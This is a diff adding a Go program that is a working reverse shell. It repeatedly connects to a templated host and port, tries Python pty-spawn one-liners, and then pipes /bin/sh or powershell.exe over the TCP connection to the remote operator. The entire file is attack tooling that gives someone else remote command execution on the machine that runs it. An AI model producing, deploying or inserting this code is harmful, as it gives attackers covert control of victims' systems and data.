@@ -1,0 +1,56 @@
+package main
+
+import (
+	"net"
+	"os/exec"
+	"runtime"
+	"time"
+)
+
+var linuxPayloadsPTY = map[int]string{
+	1: `/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'`,
+	2: `/usr/bin/python2.7 -c 'import pty;pty.spawn("/bin/bash")'`,
+	3: `/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'`}
+var windowsPayloadsPTY = map[int]string{}
+
+func main() {
+	reverseShell("template-host", "template-port")
+}
+
+func reverseShell(host string, port string) {
+	for {
+		connexion, err := net.Dial("tcp", host+":"+port)
+		if err != nil {
+			time.Sleep(2 * time.Second)
+		} else {
+			connexion.Write([]byte("[+] Connected to " + connexion.LocalAddr().String() + "\n"))
+			if runtime.GOOS == "windows" {
+				findPTYShell(connexion, windowsPayloadsPTY, "powershell.exe")
+			} else {
+				findPTYShell(connexion, linuxPayloadsPTY, "/bin/sh")
+			}
+			connexion.Close()
+		}
+	}
+}
+
+func spawnShell(connexion net.Conn, shellProgram string, arguments ...string) {
+	connexion.Write([]byte("[+] Shell spawned.\n[!] Please type \"exit\" to exit the shell or the process will freeze server-side.\n"))
+	shell := exec.Command(shellProgram)
+	shell.Stdout, shell.Stderr, shell.Stdin = connexion, connexion, connexion
+	shell.Run()
+}
+
+func findPTYShell(connexion net.Conn, payloadList map[int]string, shellProgram string) {
+	connexion.Write([]byte("[+] Trying payloads...\n"))
+	for _, payload := range payloadList {
+		tryPayload := exec.Command(shellProgram, payload)
+		err := tryPayload.Run()
+		if err == nil {
+			connexion.Write([]byte("[+] Payload worked ! Spawning TTY shell.\n"))
+			spawnShell(connexion, shellProgram, payload)
+		}
+	}
+	connexion.Write([]byte("[-] Any payload worked, spawning native shell.\n"))
+	spawnShell(connexion, shellProgram)
+}
